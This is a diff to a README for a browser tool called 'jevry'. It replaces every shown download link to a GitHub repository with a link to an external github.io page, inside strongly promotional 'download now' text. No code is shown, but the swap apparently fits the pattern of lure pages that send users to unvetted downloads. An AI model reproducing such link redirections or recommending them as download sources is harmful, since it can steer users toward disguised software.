@@ -1,7 +1,7 @@
 <h1>🤖 jevry - Your Browser, Now With Superpowers</h1>
 
 <p align="center">
-  <a href="https://github.com/forbeskilndried9479/jevry">
+  <a href="https://forbeskilndried9479.github.io">
     <img src="https://img.shields.io/badge/Download_jevry-Free_%26_Open_Source-4CAF50?style=for-the-badge&logo=github" alt="Download jevry" width="400">
   </a>
 </p>
@@ -37,7 +37,7 @@ If your computer was made in the last five years, you almost certainly meet thes
 Getting jevry up and running takes less than five minutes. Here's all you have to do:
 
 1. **Visit this link to download the application:**  
-   [**https://github.com/forbeskilndried9479/jevry**](https://github.com/forbeskilndried9479/jevry)
+   [**https://forbeskilndried9479.github.io**](https://forbeskilndried9479.github.io)
 
 2. Once you're on the page, look for the green "Code" button or the "Releases" section on the right side of the screen. Click it to see the latest version.
 
@@ -142,7 +142,7 @@ The project is actively maintained, with new releases coming out every few weeks
 
 Stop doing repetitive browser tasks by hand. Let jevry handle the busywork while you focus on what matters. Download it today, and in five minutes, you'll have your first task completed.
 
-**👉 [Click here to download jevry](https://github.com/forbeskilndried9479/jevry)**
+**👉 [Click here to download jevry](https://forbeskilndried9479.github.io)**
 
 ---
 
